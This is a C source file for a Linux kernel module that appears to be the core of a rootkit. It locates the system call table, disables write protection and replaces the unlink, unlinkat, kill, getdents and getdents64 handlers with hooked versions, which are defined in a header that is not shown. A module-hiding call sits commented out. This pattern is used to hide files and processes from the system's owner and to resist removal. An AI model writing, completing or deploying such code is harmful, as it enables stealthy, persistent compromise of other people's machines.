#include "hooks.h"
MODULE_LICENSE("GPL");
MODULE_AUTHOR("n1ls_lawiet");

int init_module(void) {
	syscall_table=(unsigned long*)get_syscall_table();
	if(!syscall_table)
		return -1;
	printk(KERN_ALERT "Module_INIT\n");
	DISABLE_W_PROTECTION
	//module_hide();
	unlink = (void *)syscall_table[__NR_unlink];		//<-
	unlinkat = (void *)syscall_table[__NR_unlinkat];	//<-
	kill = (void*)syscall_table[__NR_kill];		//<-
	getdents = (void*)syscall_table[__NR_getdents];
	getdents64 = (void*)syscall_table[__NR_getdents64];
	syscall_table[__NR_unlink] = (unsigned long)hooked_unlink;	//<-
	syscall_table[__NR_unlinkat] = (unsigned long)hooked_unlinkat;  //<-
	syscall_table[__NR_kill] = (unsigned long)hooked_kill;		//<-
	syscall_table[__NR_getdents] = (unsigned long)hooked_getdents;	//<-
	syscall_table[__NR_getdents64] = (unsigned long)hooked_getdents64;
	ENABLE_W_PROTECTION
	return 0;
}

void cleanup_module(void) {
	DISABLE_W_PROTECTION
	syscall_table[__NR_unlink] = (unsigned long)unlink;
	syscall_table[__NR_unlinkat] = (unsigned long)unlinkat;
	syscall_table[__NR_kill] = (unsigned long)kill;
	syscall_table[__NR_getdents] = (unsigned long)getdents;
	syscall_table[__NR_getdents64] = (unsigned long)getdents64;
	ENABLE_W_PROTECTION
	printk(KERN_ALERT "Module EXIT\n");
}
